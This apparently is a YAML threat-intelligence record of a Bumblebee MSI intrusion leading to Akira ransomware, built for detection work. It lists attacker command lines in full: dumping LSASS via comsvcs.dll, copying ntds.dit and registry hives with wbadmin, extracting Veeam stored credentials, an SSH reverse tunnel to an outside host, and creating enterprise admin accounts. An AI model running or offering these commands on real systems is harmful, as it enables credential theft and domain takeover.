description: Bumblebee malware delivered via trojanized MSI installer, followed by
  lateral movement, credential dumping, remote access installation, and Akira ransomware
  deployment.
attribution: APT group unknown; likely state-sponsored actor
malware_families:
- Bumblebee
- AdaptixC2
- Akira
TTPs:
  processes:
  - consent.exe
  - msimg32.dll
  - AdgNsy.exe
  - wbadmin.exe
  - rundll32.exe
  - ssh
  - psql.exe
  - cmd.exe
  - net.exe
  - nltest.exe
  - whoami.exe
  - systeminfo.exe
  - net user
  - net group
  - Invoke-ShareFinder
  - locker.exe
  commandline:
  - consent.exe
  - msimg32.dll
  - AdgNsy.exe
  - wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY"
    -quiet
  - "ssh [email\_protected] -R *:10400 -p22"
  - psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc
    FROM credentials"
  - 'cmd.exe /Q /c for /f "tokens=1,2 delims= " %%A in ("\"tasklist /fi \"Imagename
    eq lsass.exe\" | find \"lsass\""") do rundll32.exe C:\\windows\\System32\\comsvcs.dll,
    #+000024 %%B \\Windows\\Temp\\*.* full'
  - cmd.exe systeminfo.exe
  - 'nltest.exe /dclist:'
  - nltest.exe /domain_trusts
  - whoami.exe /groups
  - net.exe group "domain admins" /dom
  - net.exe group "enterprise admins" /dom
  - net user backup_EA P@ssw0rd1234 /add /dom
  - net group "enterprise admins" backup_EA /add /dom
  powershell: []
  scripting_engine:
  - Invoke-ShareFinder
  registry_keys: []
  image_load:
  - consent.exe loaded msimg32.dll
  network_connections:
  - process: AdgNsy.exe
    destination: 109.205.195.211:443
  - process: AdgNsy.exe
    destination: 188.40.187.145:443
  - process: AdgNsy.exe
    destination: 172.96.137.160:443
  - process: ssh
    destination: 193.242.184.150:22
  - process: FileZilla
    destination: 185.174.100.203:22
  file_activity:
  - C:\\Users\\*\\Desktop\\ManageEngine-OpManager.msi
  - C:\\ProgramData\\*.msi
  - C:\\Windows\\Temp\\*.*
  - C:\\ProgramData\\shares.txt
  persistence:
  - 'Domain account creation: backup_DA, backup_EA'
  - Adding backup_EA to Enterprise Administrators group
  - RDP session using backup_EA
  - Installation of RustDesk remote access tool
  process_relations: {}
